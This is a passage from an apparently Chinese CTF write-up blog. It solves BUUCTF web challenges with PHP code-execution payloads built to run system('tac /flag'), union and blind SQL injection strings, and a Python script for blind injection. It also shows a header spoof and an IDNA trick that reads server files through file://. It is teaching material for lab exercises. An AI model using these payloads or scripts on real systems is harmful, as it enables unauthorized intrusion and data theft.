&#125;<br>    &#125;<br>    <span class="hljs-comment">//帮你算出答案</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br><span class="hljs-comment">//白名单中的数学函数，.,^等，同时长度限制在80个字符以内</span><br><span class="hljs-comment">//有两种思路，在这之前有几个php的特点要熟悉。</span><br><br><span class="hljs-comment">//动态函数</span><br><span class="hljs-comment">//php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数</span><br><span class="hljs-comment">//例如：$function = &quot;sayHello&quot;;$function();</span><br><br><span class="hljs-comment">//php中函数名默认为字符串</span><br><span class="hljs-comment">//例如本题白名单中的asinh和pi可以直接异或，这就增加了构造字符的选择</span><br><span class="hljs-number">1</span>.payload<br><span class="hljs-variable">$pi</span>=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>));(<span class="hljs-variable">$$pi</span>)&#123;pi&#125;((<span class="hljs-variable">$$pi</span>)&#123;abs&#125;)&amp;pi=system&amp;abs=tac /flag<br><br>base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>) =&gt; <span class="hljs-string">&quot;hex2bin&quot;</span><br>dechex(<span class="hljs-number">1598506324</span>) =&gt; <span class="hljs-string">&quot;5f474554&quot;</span><br><span class="hljs-variable">$pi</span>=hex2bin(<span class="hljs-string">&quot;5f474554&quot;</span>) =&gt; <span class="hljs-variable">$pi</span>=<span class="hljs-string">&quot;_GET&quot;</span>   <span class="hljs-comment">//hex2bin将一串16进制数转换为二进制字符串</span><br>(<span class="hljs-variable">$$pi</span>)&#123;pi&#125;((<span class="hljs-variable">$$pi</span>)&#123;abs&#125;) =&gt; (<span class="hljs-variable">$_GET</span>)&#123;pi&#125;(<span class="hljs-variable">$_GET</span>)&#123;abs&#125;  <span class="hljs-comment">//&#123;&#125;可以代替[]</span><br><br><span class="hljs-number">2</span>.payload<br>    <br><span class="hljs-variable">$pi</span>=base_convert,<span class="hljs-variable">$pi</span>(<span class="hljs-number">696468</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-variable">$pi</span>(<span class="hljs-number">8768397090111664438</span>,<span class="hljs-number">10</span>,<span class="hljs-number">30</span>)()&#123;<span class="hljs-number">1</span>&#125;)<br>post传参执行命令<br>    <br>    <br><span class="hljs-number">3</span>.payload<br><span class="hljs-comment">//exec(&#x27;hex2bin(dechex(109270211257898))&#x27;) =&gt; exec(&#x27;cat f*&#x27;)</span><br>(<span class="hljs-variable">$pi</span>=base_convert)(<span class="hljs-number">22950</span>,<span class="hljs-number">23</span>,<span class="hljs-number">34</span>)(<span class="hljs-variable">$pi</span>(<span class="hljs-number">76478043844</span>,<span class="hljs-number">9</span>,<span class="hljs-number">34</span>)(dechex(<span class="hljs-number">109270211257898</span>)))<br><span class="hljs-comment">//system(&#x27;cat&#x27;.dechex(16)^asinh^pi) =&gt; system(&#x27;cat *&#x27;)</span><br>base_convert(<span class="hljs-number">1751504350</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(base_convert(<span class="hljs-number">15941</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>).(dechex(<span class="hljs-number">16</span>)^asinh^pi))<br>    <br>    <br>    <br></code></pre></td></tr></table></figure><h2 id="5-MRCTF2020-PYWebsite"><a href="#5-MRCTF2020-PYWebsite" class="headerlink" title="5.[MRCTF2020]PYWebsite"></a>5.[MRCTF2020]PYWebsite</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js">   <br><span class="hljs-comment">//查看网页源代码发现有一个./flag.php网页,访问发现说只有购买者和我自己知道flag,所以加一个请求头X-Forward-For:127.0.0.1,然后继续访问拿到flag.</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">enc</span>(<span class="hljs-params">code</span>)</span>&#123;<br>      hash = hex_md5(code);<br>      <span class="hljs-keyword">return</span> hash;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">validate</span>(<span class="hljs-params"></span>)</span>&#123;<br>      <span class="hljs-keyword">var</span> code = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;vcode&quot;</span>).value;<br>      <span class="hljs-keyword">if</span> (code != <span class="hljs-string">&quot;&quot;</span>)&#123;<br>        <span class="hljs-keyword">if</span>(hex_md5(code) == <span class="hljs-string">&quot;0cd4da0223c0b280829dc3ea458d655c&quot;</span>)&#123;<br>          alert(<span class="hljs-string">&quot;您通过了验证！&quot;</span>);<br>          <span class="hljs-built_in">window</span>.location = <span class="hljs-string">&quot;./flag.php&quot;</span><br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>          alert(<span class="hljs-string">&quot;你的授权码不正确！&quot;</span>);<br>        &#125;<br>      &#125;<span class="hljs-keyword">else</span>&#123;<br>        alert(<span class="hljs-string">&quot;请输入授权码&quot;</span>);<br>      &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="6-SWPU2019-Web1"><a href="#6-SWPU2019-Web1" class="headerlink" title="6.[SWPU2019]Web1"></a>6.[SWPU2019]Web1</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/union/**/select/**/1,user(),version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><span class="hljs-number">22</span><br>root<span class="hljs-variable">@localhost</span><span class="hljs-number">10.2</span><span class="hljs-number">.26</span><span class="hljs-operator">-</span>MariaDB<span class="hljs-operator">-</span>log<br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/union/**/select/**/1,database(),version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><span class="hljs-number">22</span>web1<span class="hljs-number">10.2</span><span class="hljs-number">.26</span><span class="hljs-operator">-</span>MariaDB<span class="hljs-operator">-</span>log<br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><span class="hljs-number">22</span><br>FLAG_TABLE,news,users,gtid_slave_pos,ads,users<br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/union/**/select/**/1,(select/**/group_concat(a)/**/from/**/(select/**/1,2,3/**/as/**/a/**/union/**/select/**/*/**/from/**/users)qaq),version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><span class="hljs-number">22</span><br><span class="hljs-number">3</span>,flag&#123;<span class="hljs-number">842</span>b63d9<span class="hljs-operator">-</span>f8ce<span class="hljs-number">-4346</span><span class="hljs-operator">-</span>ac05<span class="hljs-operator">-</span>a2713b4f8232&#125;,<span class="hljs-number">53e217</span>ad4c721eb9565cf25a5ec3b66e,e10adc3949ba59abbe56e057f20f883e<br><br><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> secret;<br><span class="hljs-operator">+</span><span class="hljs-comment">------+------+--------+</span><br><span class="hljs-operator">|</span> kkk  <span class="hljs-operator">|</span> lion <span class="hljs-operator">|</span> leo    <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------+------+--------+</span><br><span class="hljs-operator">|</span> <span class="hljs-number">1234</span> <span class="hljs-operator">|</span> <span class="hljs-number">5678</span> <span class="hljs-operator">|</span> <span class="hljs-number">123123</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------+------+--------+</span><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> secret;<br><span class="hljs-operator">+</span><span class="hljs-comment">------+------+--------+</span><br><span class="hljs-operator">|</span> <span class="hljs-number">1</span>    <span class="hljs-operator">|</span> <span class="hljs-number">2</span>    <span class="hljs-operator">|</span> <span class="hljs-number">3</span>      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------+------+--------+</span><br><span class="hljs-operator">|</span>    <span class="hljs-number">1</span> <span class="hljs-operator">|</span>    <span class="hljs-number">2</span> <span class="hljs-operator">|</span>      <span class="hljs-number">3</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> <span class="hljs-number">1234</span> <span class="hljs-operator">|</span> <span class="hljs-number">5678</span> <span class="hljs-operator">|</span> <span class="hljs-number">123123</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------+------+--------+</span><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> secret;<br><span class="hljs-operator">+</span><span class="hljs-comment">------+------+--------+</span><br><span class="hljs-operator">|</span> kkk  <span class="hljs-operator">|</span> lion <span class="hljs-operator">|</span> leo    <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------+------+--------+</span><br><span class="hljs-operator">|</span> <span class="hljs-number">1234</span> <span class="hljs-operator">|</span> <span class="hljs-number">5678</span> <span class="hljs-operator">|</span> <span class="hljs-number">123123</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------+------+--------+</span><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> `<span class="hljs-number">2</span>` <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> secret)asd;<br><span class="hljs-operator">+</span><span class="hljs-comment">------+</span><br><span class="hljs-operator">|</span> <span class="hljs-number">2</span>    <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------+</span><br><span class="hljs-operator">|</span>    <span class="hljs-number">2</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> <span class="hljs-number">5678</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------+</span><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> a <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">as</span> a,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> secret)qw;<br><span class="hljs-operator">+</span><span class="hljs-comment">------+</span><br><span class="hljs-operator">|</span> a    <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------+</span><br><span class="hljs-operator">|</span>    <span class="hljs-number">2</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> <span class="hljs-number">5678</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------+</span><br><br>过滤了<span class="hljs-keyword">order</span>的时候，可以用<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> 来测试有多少行<br>单引号闭合，正常闭合会出错的话，可以,<span class="hljs-string">&#x27;2。这样闭合</span><br><span class="hljs-string">无列名注入</span><br><span class="hljs-string">一般都有limit 0,1的限制，可用group_concat()来将数据弄到一行中去</span><br><span class="hljs-string">空格用/**/内敛注释绕过</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h2 id="7-SUCTF-2019-Pythonginx"><a href="#7-SUCTF-2019-Pythonginx" class="headerlink" title="7.[SUCTF 2019]Pythonginx"></a>7.[SUCTF 2019]Pythonginx</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">@app.route(<span class="hljs-string">&#x27;/getUrl&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]) <br>def getUrl(): <br>    url = request.args.get(<span class="hljs-string">&quot;url&quot;</span>) <br>    host = parse.urlparse(url).hostname  <span class="hljs-comment">#解析主机名</span><br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>: <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我扌 your problem? 111&quot;</span> <br>    parts = <span class="hljs-keyword">list</span>(urlsplit(url)) <br>    host = parts[<span class="hljs-number">1</span>] <br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>: <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我扌 your problem? 222 &quot;</span> + host <br>    newhost = [] <br>    <span class="hljs-keyword">for</span> h in host.split(<span class="hljs-string">&#x27;.&#x27;</span>): <br>        newhost.append(h.encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)) <br>        parts[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;.&#x27;</span>.join(newhost) <span class="hljs-comment">#去掉 url 中的空格 </span><br>        finalUrl = urlunsplit(parts).split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>] <span class="hljs-comment"># 将主机名再次组合成 url</span><br>        host = parse.urlparse(finalUrl).hostname <br>        <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>: <br>            <span class="hljs-keyword">return</span> urllib.request.urlopen(finalUrl).read() <br>        <span class="hljs-keyword">else</span>: <br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我扌 your problem? 333&quot;</span> <br></code></pre></td></tr></table></figure><p>前两个 if 判断 host是否含有 suctf.cc 如果有就报错，经过 utf-8 解码 idna 编码 之后传入到 urlunsplit函数 组合成url ，再用 if 和suctf.cc进行一次比较 如果相同 就 进行读取。</p><p>我们先了解下 idna<br>idna 国际化域名应用，国际化域名(Internationalized Domain Name,IDN)又名特殊字符域名，是指部分或完全使用特殊文字或字母组成的互联网域名，包括中文、发育、阿拉伯语、希伯来语或拉丁字母等非英文字母，这些文字经过多字节万国码编码而成。在域名系统中，国际化域名使用punycode转写并以<br>ASCII字符串存储。<br>.<br>℆这个字符,如果使用python3进行idna编码的话<br>print(‘℆’.encode(‘idna’))<br>结果<br>b’c/u’<br>如果再使用utf-8进行解码的话<br>print(b’c/u’.decode(‘utf-8’))<br>结果<br>c/u<br>通过这种方法可以绕过本题</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nginx">nginx目录：<br>配置文件存放目录：/etc/<span class="hljs-attribute">nginx</span><br>主配置文件：/etc/nginx/conf/nginx.conf<br>管理脚本：/usr/lib64/systemd/system/nginx.service<br>模块：/usr/lisb64/nginx/modules<br>应用程序：/usr/sbin/nginx<br>程序默认存放位置：/usr/share/nginx/html<br>日志默认存放位置：/var/log/nginx<br>配置文件目录为：/usr/local/nginx/conf/nginx.conf<br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html">getUrl?url=file://suctf.c℆sr/local/nginx/conf/nginx.conf<br>得到：<br>server &#123; listen 80; location / &#123; try_files $uri @app; &#125; location @app &#123; include uwsgi_params; uwsgi_pass unix:///tmp/uwsgi.sock; &#125; location /static &#123; alias /app/static; &#125; # location /flag &#123; # alias /usr/fffffflag; # &#125; &#125;<br><br>getUrl?url=file://suctf.c℆sr/fffffflag<br>得到：<br>flag&#123;2baa12f7-2b11-4be9-8e94-1a34b2b50ecf&#125;<br></code></pre></td></tr></table></figure><h2 id="8-极客大挑战-2019-FinalSQL"><a href="#8-极客大挑战-2019-FinalSQL" class="headerlink" title="8.[极客大挑战 2019]FinalSQL"></a>8.[极客大挑战 2019]FinalSQL</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://34779a2c-91f2-4ce2-b412-8c76e1bdb4bb.node4.buuoj.cn:81/search.php?id=&#x27;</span><br>dblen = <span class="hljs-string">&#x27;1^(length(database())=&#x27;</span>   <span class="hljs-comment"># final 4</span><br><br>dbname = <span class="hljs-string">&#x27;1^(ascii(substr(database(),&#x27;</span>  <span class="hljs-comment">#geek</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">123</span>):<br>        finurl = url+dbname+<span class="hljs-built_in">str</span>(i)+url1+<span class="hljs-built_in">str</span>(j)+<span class="hljs-string">&#x27;)&#x27;</span><br>        req = requests.get(finurl)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;ERROR&#x27;</span> <span class="hljs-keyword">in</span> req.text:<br>            name = name+<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(name)<br>            <span class="hljs-keyword">break</span><br><br><br>tblen = <span class="hljs-string">&#x27;1^((select(length(group_concat(TABLE_NAME)))from(information_schema.tables)where(table_schema=&quot;geek&quot;))=i)&#x27;</span><br><span class="hljs-comment">#i=16</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    finurl = url+tblen+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;)&#x27;</span><br>    req = requests.get(finurl)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;ERROR&#x27;</span> <span class="hljs-keyword">in</span> req.text:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br>        <br>        <br>tbname = <span class="hljs-string">&#x27;1^(ascii(substr(select(group_concat(table_name))&#x27;</span> \<br>        <span class="hljs-string">&#x27;from(information_schema.tables)where(table_schema=&quot;dbname&quot;),i,1))=j)&#x27;</span><br><span class="hljs-comment">#F1naI1y,Flaaaaag</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">17</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">123</span>):<br>        finurl = url+tbname+<span class="hljs-built_in">str</span>(i)+url1+<span class="hljs-built_in">str</span>(j)+<span class="hljs-string">&#x27;)&#x27;</span><br>        req = requests.get(finurl)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;ERROR&#x27;</span> <span class="hljs-keyword">in</span> req.text:<br>            name = name+<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(name)<br>            <span class="hljs-keyword">break</span><br>            <br><br>colulen = <span class="hljs-string">&#x27;1^((select(length(group_concat(COLUMN_NAME)))&#x27;</span> \<br>          <span class="hljs-string">&#x27;from(information_schema.columns)where(table_name=&quot;tbname&quot;))=i)&#x27;</span><br><span class="hljs-comment">#Flaaaaag 11 F1naI1y20</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    finurl = url+colulen+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;)&#x27;</span><br>    req = requests.get(finurl)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;ERROR&#x27;</span> <span class="hljs-keyword">in</span> req.text:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br>        <br>        <br>coluname = <span class="hljs-string">&#x27;1^(ascii(substr(select(group_concat(column_name))&#x27;</span> \<br>           <span class="hljs-string">&#x27;from(information_schema.columns)where(table_name=&quot;tbname&quot;),i,1))=j)&#x27;</span><br><span class="hljs-comment">#Flaaaaag--id,fl4gawsl</span><br><span class="hljs-comment">#F1naI1y--id,username,password</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">12</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">123</span>):<br>        finurl = url+coluname+<span class="hljs-built_in">str</span>(i)+url1+<span class="hljs-built_in">str</span>(j)+<span class="hljs-string">&#x27;)&#x27;</span><br>        req = requests.get(finurl)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;ERROR&#x27;</span> <span class="hljs-keyword">in</span> req.text:<br>            name = name+<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(name)<br>            <span class="hljs-keyword">break</span><br><br>valulen = <span class="hljs-string">&#x27;1^((select(length(group_concat(coluname)))from(tbname))=213)&#x27;</span><br><span class="hljs-comment">#213</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">300</span>):<br>    finurl = url+valulen+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;)&#x27;</span><br>    req = requests.get(finurl)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;ERROR&#x27;</span> <span class="hljs-keyword">in</span> req.text:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br><br><br>value = <span class="hljs-string">&#x27;1^(ascii(substr((select(group_concat(coluname))from(tbname)),i,1))=j)&#x27;</span><br><span class="hljs-comment">#cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.tmp,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_nee[_a_grilfriend,flag&#123;dc63a59b-0dc1-4fdb-86cf-9d8411048989&#125;</span><br><br><span class="hljs-comment">#flag&#123;dc63a59b-0dc1-4fdb-86cf-9d8411048989&#125;</span><br>num = <span class="hljs-number">1</span><br>url1 = <span class="hljs-string">&#x27;,1))=&#x27;</span><br><br>name = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">171</span>,<span class="hljs-number">214</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>        finurl = url+value+<span class="hljs-built_in">str</span>(i)+url1+<span class="hljs-built_in">str</span>(j)+<span class="hljs-string">&#x27;)&#x27;</span><br>        req = requests.get(finurl)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;ERROR&#x27;</span> <span class="hljs-keyword">in</span> req.text:<br>            name = name+<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(name)<br>            <span class="hljs-keyword">break</span><br>            <br>            <br><span class="hljs-comment">#for循环跑的好慢好慢，需要用------二分法，快的一批</span><br><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;http://34779a2c-91f2-4ce2-b412-8c76e1bdb4bb.node4.buuoj.cn:81/search.php&quot;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    low = <span class="hljs-number">32</span><br>    high = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> low &lt; high:<br>        mid = (low+high)//<span class="hljs-number">2</span><br>        <span class="hljs-comment"># 中间的语句为真，网页不报错，中间的语句为假，网页报错，根据这个判断</span><br>        <span class="hljs-comment"># 查数据库</span><br>        database = <span class="hljs-string">&quot;?id=1^(ord(substr((select(database())),%d,1))&gt;%d)^1&quot;</span> % (i, mid)<br>        <span class="hljs-comment"># 查表</span><br>        tables = <span class="hljs-string">&quot;?id=1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),%d,1))&gt;%d)^1&quot;</span>%(i,j)<br>        columns = <span 